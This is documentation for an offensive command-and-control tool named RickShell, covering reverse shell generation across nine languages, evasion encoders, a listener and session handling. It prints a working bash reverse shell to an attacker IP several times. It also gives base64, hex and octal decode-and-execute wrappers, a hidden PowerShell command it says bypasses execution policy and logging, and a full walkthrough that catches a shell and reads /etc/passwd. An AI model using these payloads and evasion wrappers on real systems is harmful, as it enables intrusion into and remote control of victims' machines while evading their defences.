# RickShell Documentation
### Advanced Modular C2 Framework — Red Team Edition

> **Legal Disclaimer:** RickShell is intended exclusively for authorized penetration testing, red team engagements, and educational purposes. Using this tool against systems you do not own or have explicit written permission to test is illegal. The authors accept no responsibility for misuse.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Project Structure](#2-project-structure)
3. [Installation](#3-installation)
4. [Launching RickShell](#4-launching-rickshell)
5. [Command Reference](#5-command-reference)
   - [show](#show)
   - [set](#set)
   - [generate](#generate)
   - [listen](#listen)
   - [sessions](#sessions)
   - [interact](#interact)
   - [background](#background)
   - [exit](#exit)
6. [Payload Reference](#6-payload-reference)
7. [Encoder Reference](#7-encoder-reference)
8. [Full Attack Walkthrough](#8-full-attack-walkthrough)
9. [Tips & Best Practices](#9-tips--best-practices)

---

## 1. Overview

RickShell is a terminal-based Command & Control (C2) framework written in Python 3. It is designed for red team operators and penetration testers who need a fast, modular tool for generating reverse shell payloads, catching connections, and managing interactive sessions.

**Core capabilities:**

- Generate reverse shell payloads for 9 languages and 31 variants
- Apply WAF-evasion encoders (Base64, Hex, URL, Octal, PowerShell Base64)
- Start a background TCP listener that catches incoming connections
- Manage multiple simultaneous sessions from a single interface
- Interact with victim shells in real time with a full PTY experience (arrow keys, tab completion, `cd` persistence)

---

## 2. Project Structure

```
RickShell/
├── rickshell.py            # Entry point
├── setup.sh                # Installer script
├── core/
│   ├── listener.py         # Threaded TCP listener
│   ├── session_manager.py  # Tracks active sessions
│   └── utils.py            # Network interface detection, port utilities
├── interface/
│   ├── console.py          # Interactive CLI
│   └── colors.py           # ANSI color helpers
└── modules/
    ├── builder.py          # Payload configuration and generation logic
    ├── payloads.py         # Raw payload database (31 variants)
    └── encoders.py         # Encoding and shell-aware wrapping
```

---

## 3. Installation

### Prerequisites

| Requirement | Version  |
|-------------|----------|
| Python      | 3.8+     |
| pip3        | Any      |
| psutil      | Any      |
| OS          | Linux    |

### Automatic Installation (Recommended)

Run the installer script from the RickShell directory. It will check and install all dependencies, copy files to `/opt/RickShell`, and create a system-wide `rickshell` command.

```bash
chmod +x setup.sh
./setup.sh
```

After installation completes, you can launch RickShell from anywhere:

```bash
rickshell
```

### Manual Installation

If you prefer not to use the installer:

```bash
pip3 install psutil --break-system-packages
python3 rickshell.py
```

---

## 4. Launching RickShell

```bash
rickshell
# or if running manually from the project folder:
python3 rickshell.py
```

On launch you will see the banner and be dropped into the interactive prompt:

```
  ______  _      _     _____ _          _ _
  | ___ \(_)    | |   /  ___| |        | | |
  | |_/ / _  ___| | __\ `--.| |__   ___| | |
  |    / | |/ __| |/ / `--. \ '_ \ / _ \ | |
  | |\ \ | | (__|   </\__/ / | | |  __/ | |
  \_| \_|_|\___|_|\_\\____/|_| |_|\___|_|_|

  Advanced Modular C2 Framework | Red Team Edition
  Type 'help' for available commands.

RickShell >
```

RickShell automatically detects your network interfaces and selects a free port, so you can run `generate` immediately without any manual configuration.

---

## 5. Command Reference

---

### `show`

Displays information about options, interfaces, payloads, or encoders.

**Syntax:**
```
show [options | interfaces | payloads | encoders]
```

---

#### `show options`

Displays the current payload configuration.

```
RickShell > show options

Option                  Value
----------------------  ----------------------
LHOST                   192.168.0.7
LPORT                   4444
INTERFACE               eth0
PAYLOAD                 bash_tcp
ENCODER                 none
```

| Option    | Description                                                      |
|-----------|------------------------------------------------------------------|
| LHOST     | Your attacker IP address. Embedded in the generated payload.     |
| LPORT     | The port the listener will bind to.                              |
| INTERFACE | Network interface used to auto-resolve LHOST.                    |
| PAYLOAD   | The selected payload type. See [Payload Reference](#6-payload-reference). |
| ENCODER   | Encoding applied to the payload. See [Encoder Reference](#7-encoder-reference). |

---

#### `show interfaces`

Lists all detected network interfaces and their IPv4 addresses.

```
RickShell > show interfaces

Interface               IPv4 Address
----------------------  ----------------------
eth0                    192.168.0.7
tun0                    10.10.14.5
lo                      127.0.0.1
```

> **Tip:** For VPN-based engagements (e.g. HackTheBox, TryHackMe), set your interface to `tun0` to use the VPN IP.

---

#### `show payloads`

Lists all available payload keys grouped by language.

```
RickShell > show payloads

  [PYTHON]
    python_socket
    python_subprocess
    python_thread
    python_ipv6

  [BASH]
    bash_tcp
    bash_tcp_nohup
    bash_udp
    bash_196
    bash_5
    bash_readline
  ...
```

---

#### `show encoders`

Lists all available encoders with descriptions.

```
RickShell > show encoders

Encoder             Description
------------------  ----------------------------------
none                No encoding, raw payload
base64              Base64 + shell-aware wrapper
hex                 Hex encoding + decode wrapper
url                 URL encoding + python exec wrapper
octal               Octal escape + echo -e | bash
ps_base64           UTF-16LE Base64 for PowerShell -Enc
```

---

### `set`

Sets a configuration option. Supports automatic typo correction.

**Syntax:**
```
set <OPTION> <VALUE>
```

#### Setting LHOST

Set your attacker IP address manually:

```
RickShell > set LHOST 10.10.14.5
[+] LHOST => 10.10.14.5
```

#### Setting LHOST via Interface

Let RickShell resolve the IP from your interface name:

```
RickShell > set INTERFACE tun0
[+] INTERFACE => tun0
```

This automatically sets LHOST to the IP assigned to `tun0`.

#### Setting LPORT

```
RickShell > set LPORT 4444
[+] LPORT => 4444
```

Valid range: 1–65535. If not set, RickShell picks a random free port automatically.

#### Setting the Payload

```
RickShell > set PAYLOAD python_socket
[+] PAYLOAD => python_socket
```

Use `show payloads` to see all valid payload keys.

#### Setting the Encoder

```
RickShell > set ENCODER base64
[+] ENCODER => base64
```

Use `show encoders` to see all valid encoder names.

#### Typo Correction

RickShell automatically corrects close typos using fuzzy matching:

```
RickShell > set enocder base64
[~] Auto-corrected 'enocder' -> 'encoder'
[+] ENCODER => base64

RickShell > set lhsot 10.10.14.5
[~] Auto-corrected 'lhsot' -> 'lhost'
[+] LHOST => 10.10.14.5
```

---

### `generate`

Generates the final payload string using the current configuration and prints it to the screen. Prompts you to start a listener immediately.

```
RickShell > generate

[+] Generated Payload:

  bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

[?] Start listener on port 4444? (y/n):
```

- The payload is ready to copy and execute on the target machine.
- Answer `y` to start the listener without returning to the prompt.
- Answer `n` to copy the payload and start the listener manually later with `listen`.

---

### `listen`

Starts the TCP listener manually in the background without generating a payload.

```
RickShell > listen

[*] Listener started — binding 0.0.0.0:4444, payload LHOST: 10.10.14.5
    Waiting for incoming connections...
```

- The listener always binds to `0.0.0.0` (all interfaces) so it catches connections regardless of which interface the target routes through.
- It runs as a background thread — you can keep using the RickShell prompt while it waits.
- When a connection arrives, you are notified automatically:

```
RickShell >
[+] New connection from 10.10.10.100:51234 — Session ID: 0
```

---

### `sessions`

Lists all currently active sessions.

```
RickShell > sessions

ID                  IP Address          Port
------------------  ------------------  ------------------
0                   10.10.10.100        51234
1                   10.10.10.101        39104
```

| Column     | Description                                  |
|------------|----------------------------------------------|
| ID         | Session number used with the `interact` command |
| IP Address | The remote host's IP address                 |
| Port       | The remote host's source port                |

---

### `interact`

Enters a fully interactive shell session with the specified session ID.

**Syntax:**
```
interact <session_id>
```

**Example:**
```
RickShell > interact 0

[*] Entering session 0 (10.10.10.100:51234)
    Ctrl+C to background session.

┌──(root㉿target)-[~]
└─# id
uid=0(root) gid=0(root) groups=0(root)

┌──(root㉿target)-[~]
└─# whoami
root
```

#### What happens when you interact

When you first connect to a session, RickShell automatically performs a **PTY upgrade** on the victim shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This upgrades the raw socket into a full pseudo-terminal, enabling:

| Feature | Without PTY | With PTY |
|---------|------------|---------|
| Arrow keys | ✘ | ✔ |
| Tab completion | ✘ | ✔ |
| `cd` persistence | ✘ | ✔ |
| `nano` / `vim` | ✘ | ✔ |
| `sudo` prompts | ✘ | ✔ |
| `Ctrl+C` in victim | Kills session | ✔ Sends signal |

RickShell also automatically synchronizes your terminal size to the victim shell so output wraps correctly.

The PTY upgrade only happens **once per session**. If you background and re-interact, the shell is already upgraded and connects instantly.

---

### `background`

Press `Ctrl+C` once while inside an `interact` session to background it and return to the RickShell prompt. The remote session stays alive.

```
^C
[*] Backgrounded. Session still active.
RickShell >
```

You can re-enter the session at any time:

```
RickShell > interact 0
```

---

### `exit`

Shuts down RickShell, stops the listener, and closes all sessions.

```
RickShell > exit

[*] Shutting down RickShell...
```

You can also press `Ctrl+D` to exit.

---

## 6. Payload Reference

RickShell includes 31 payload variants across 9 languages. Use `set PAYLOAD <key>` to select one.

### Python (4 variants)

| Key | Description |
|-----|-------------|
| `python_socket` | Socket + PTY spawn via `pty.spawn()`. Most stable, gives full TTY. **Recommended.** |
| `python_subprocess` | Socket + subprocess call. Works when `pty` is unavailable. |
| `python_thread` | Threaded socket handler. Useful for non-blocking execution. |
| `python_ipv6` | Socket + PTY via IPv6. Use when target is IPv6-only. |

### Bash (6 variants)

| Key | Description |
|-----|-------------|
| `bash_tcp` | Classic bash reverse shell over TCP. Default payload. |
| `bash_tcp_nohup` | Runs in background with `nohup`. Survives terminal close. |
| `bash_udp` | Bash reverse shell over UDP. |
| `bash_196` | Uses file descriptor 196. Useful when `>&` is blocked. |
| `bash_5` | Uses file descriptor 5. Alternative FD method. |
| `bash_readline` | Uses readline. Works in restricted shells. |

### Netcat (5 variants)

| Key | Description |
|-----|-------------|
| `nc_mkfifo` | Named pipe method. Most reliable nc variant. |
| `nc_traditional` | Classic `nc -e`. Requires traditional netcat. |
| `nc_busybox` | For BusyBox environments (routers, embedded Linux). |
| `nc_nmap` | Uses ncat (nmap's netcat). Supports SSL. |
| `nc_udp` | Netcat over UDP. |

### PowerShell (3 variants)

| Key | Description |
|-----|-------------|
| `powershell_tcp` | Full-featured PowerShell TCP reverse shell. |
| `powershell_udp` | PowerShell over UDP. |
| `powershell_ssl` | Encrypted PowerShell shell over SSL. |

### PHP (4 variants)

| Key | Description |
|-----|-------------|
| `php_exec` | Uses `exec()`. |
| `php_shell_exec` | Uses `shell_exec()`. |
| `php_proc_open` | Uses `proc_open()`. Best for interactive output. |
| `php_pentestmonkey` | Classic pentestmonkey one-liner. |

### Ruby (3 variants)

| Key | Description |
|-----|-------------|
| `ruby_tcp` | Standard Ruby TCP socket shell. |
| `ruby_bash` | Spawns bash via Ruby. |
| `ruby_no_fork` | No-fork variant. Useful in restricted environments. |

### Perl (2 variants)

| Key | Description |
|-----|-------------|
| `perl_tcp` | Standard Perl socket shell. |
| `perl_pty` | Perl with PTY allocation. |

### Java (2 variants)

| Key | Description |
|-----|-------------|
| `java_runtime` | Uses `Runtime.exec()`. |
| `java_process` | Uses `ProcessBuilder`. More reliable on modern JVM. |

### Telnet (2 variants)

| Key | Description |
|-----|-------------|
| `telnet_chained` | Chained telnet commands. |
| `telnet_mkfifo` | Named pipe + telnet. |

---

## 7. Encoder Reference

Encoders transform the raw payload to evade signature-based detection (WAF, AV, IDS). RickShell uses **smart wrapping** — the encoder automatically selects the correct decode wrapper based on the payload's language.

### `none`

No encoding applied. Raw payload is used as-is.

```
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### `base64`

Encodes the payload in Base64 and wraps it in a shell-appropriate decode + execute command.

- **Bash/nc/php/ruby/perl payloads:**
  ```
  echo <b64> | base64 -d | bash
  ```
- **Python payloads:**
  ```
  python3 -c "exec(__import__('base64').b64decode('<b64>').decode())"
  ```
- **PowerShell payloads:**
  ```
  powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <utf16le_b64>
  ```

### `hex`

Encodes the payload as a hex string with a decode + execute wrapper.

- **Bash:**
  ```
  printf '%b' "$(echo '<hex>' | sed 's/../\\x&/g')" | bash
  ```
- **Python:**
  ```
  python3 -c "exec(bytes.fromhex('<hex>').decode())"
  ```

### `url`

URL-encodes the payload and wraps it in a Python `urllib.parse.unquote` + `exec` call. Useful for web application contexts.

### `octal`

Converts every byte of the payload to octal escapes and uses `echo -e` to decode and pipe to bash.

```
echo -e "\142\141\163\150 ..." | bash
```

### `ps_base64`

Encodes the payload as UTF-16LE Base64 and wraps it in the PowerShell `-Enc` flag. Used exclusively for PowerShell payloads to bypass execution policy and logging.

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <utf16le_b64>
```

---

## 8. Full Attack Walkthrough

This section walks through a complete engagement from start to finish.

### Step 1 — Launch RickShell

```bash
rickshell
```

### Step 2 — Check your interfaces

```
RickShell > show interfaces
```

Identify the correct interface for your engagement. For a VPN (HackTheBox, TryHackMe), this will typically be `tun0`.

### Step 3 — Configure your options

```
RickShell > set INTERFACE tun0
RickShell > set LPORT 4444
RickShell > set PAYLOAD bash_tcp
RickShell > set ENCODER none
```

Verify your configuration:

```
RickShell > show options

Option                  Value
----------------------  ----------------------
LHOST                   10.10.14.5
LPORT                   4444
INTERFACE               tun0
PAYLOAD                 bash_tcp
ENCODER                 none
```

### Step 4 — Generate the payload

```
RickShell > generate

[+] Generated Payload:

  bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

[?] Start listener on port 4444? (y/n): y

[*] Listener started — binding 0.0.0.0:4444, payload LHOST: 10.10.14.5
    Waiting for incoming connections...
```

### Step 5 — Execute the payload on the target

Copy the generated payload and deliver it to the target via your attack vector (command injection, RCE, malicious file, etc.). On the target machine, the payload executes:

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Step 6 — Catch the connection

RickShell notifies you when the connection arrives:

```
RickShell >
[+] New connection from 10.10.10.100:51234 — Session ID: 0
```

### Step 7 — Interact with the session

```
RickShell > interact 0

[*] Entering session 0 (10.10.10.100:51234)
    Ctrl+C to background session.

www-data@target:/var/www/html$
```

RickShell automatically upgrades the shell to a full PTY. You now have a fully interactive shell.

### Step 8 — Operate

```bash
id
whoami
uname -a
cat /etc/passwd
cd /home
ls -la
```

### Step 9 — Background and manage multiple sessions

Press `Ctrl+C` to background the session:

```
^C
[*] Backgrounded. Session still active.
RickShell >
```

Catch a second connection from another target and manage both:

```
RickShell > sessions

ID                  IP Address          Port
------------------  ------------------  ------------------
0                   10.10.10.100        51234
1                   10.10.10.101        39104

RickShell > interact 1
```

---

## 9. Tips & Best Practices

### Choosing the right payload

| Situation | Recommended Payload |
|-----------|-------------------|
| Linux target, bash available | `bash_tcp` |
| Linux target, need stable PTY immediately | `python_socket` |
| Target has no bash but has nc | `nc_mkfifo` |
| Windows target | `powershell_tcp` |
| Web shell / PHP RCE | `php_pentestmonkey` |
| Embedded device / router | `nc_busybox` |
| IPv6 network | `python_ipv6` |

### Choosing the right encoder

| Situation | Recommended Encoder |
|-----------|-------------------|
| No WAF, direct RCE | `none` |
| WAF blocking special chars | `base64` |
| PowerShell execution policy | `ps_base64` |
| URL parameter injection | `url` |
| Custom filtering | `hex` or `octal` |

### VPN engagements (HackTheBox, TryHackMe)

Always set your interface to `tun0` before generating:

```
RickShell > set INTERFACE tun0
```

### Running the listener before generating

You can start the listener first and generate the payload after — useful when you need to set up before the target is ready:

```
RickShell > set LPORT 9001
RickShell > listen
RickShell > generate
```

Answer `n` when asked to start the listener (it's already running).

### Re-interacting with a backgrounded session

Sessions persist until the remote shell closes or you run `exit`. You can background and re-interact as many times as needed:

```
RickShell > interact 0   # enter
^C                        # background
RickShell > interact 0   # re-enter instantly (already PTY upgraded)
```

### Testing locally (same machine)

When attacker and victim are the same machine, the PTY upgrade commands will be visible in your terminal — this is expected behavior since both sides share the same display. On a real separate target, the upgrade runs silently on the victim machine.
